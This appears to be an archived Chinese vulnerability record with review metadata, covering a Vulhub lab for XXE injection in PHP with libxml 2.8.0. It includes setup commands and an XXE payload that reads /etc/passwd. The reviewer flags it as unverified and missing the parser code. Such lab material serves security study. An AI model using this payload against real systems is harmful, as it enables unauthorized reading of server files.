---
source: "历史归档批(无原始出处标注)"
product: "PHP/libxml配置安全"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PHP-环境-XML外部实体注入漏洞（XXE）"
prerequisites: "来源所述条件，未列明部分仍待核：实验PHP7.0.30+libxml2.8.0；2.9.0默认行为不代表所有调用免疫"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-35ad79ecfd729493e31c2f10"
entity_id: "ve-35ad79ecfd729493e31c2f10"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：实验PHP7.0.30+libxml2.8.0；2.9.0默认行为不代表所有调用免疫

代码与实验材料：有三种API文件名及通用XML，却没有三个PHP解析调用/选项或请求方式，无法独立还原

来源证据范围：历史归档无原作者、官方或实验目录链接

- **来源与引用处置（1）**：XXE逐渐消亡和PHP版本无关结论不成立；依据：显式解析选项、加载器及PHP封装默认值会改变行为，不能只依据libxml默认策略。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

- **证据待核（2）**：缺关键解析选项；依据：让读者阅读三个未嵌入的代码文件，没有LIBXML_NOENT/DTD加载设置等决定因素。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PHP 环境 XML 外部实体注入漏洞（XXE）

## 漏洞描述

libxml 2.9.0 以后，默认不解析外部实体，导致 XXE 漏洞逐渐消亡。为了演示 PHP 环境下的 XXE 漏洞，本例会将 libxml 2.8.0 版本编译进 PHP 中。PHP 版本并不影响 XXE 利用。

## 环境搭建

Vulhub 执行如下命令启动环境（PHP 7.0.30，libxml 2.8.0）：

```
docker compose up -d
```

环境启动后，访问 `http://your-ip:8080/index.php` 即可看到 phpinfo。

## 漏洞复现

Web 目录为 `./www`，其中包含 4 个文件：

```bash
$ tree .
.
├── dom.php # 示例：使用DOMDocument解析body
├── index.php
├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body
└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body
```

`dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php` 均可触发 XXE 漏洞，具体输出点请阅读这三个文件的代码。

Simple XXE Payload：

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```


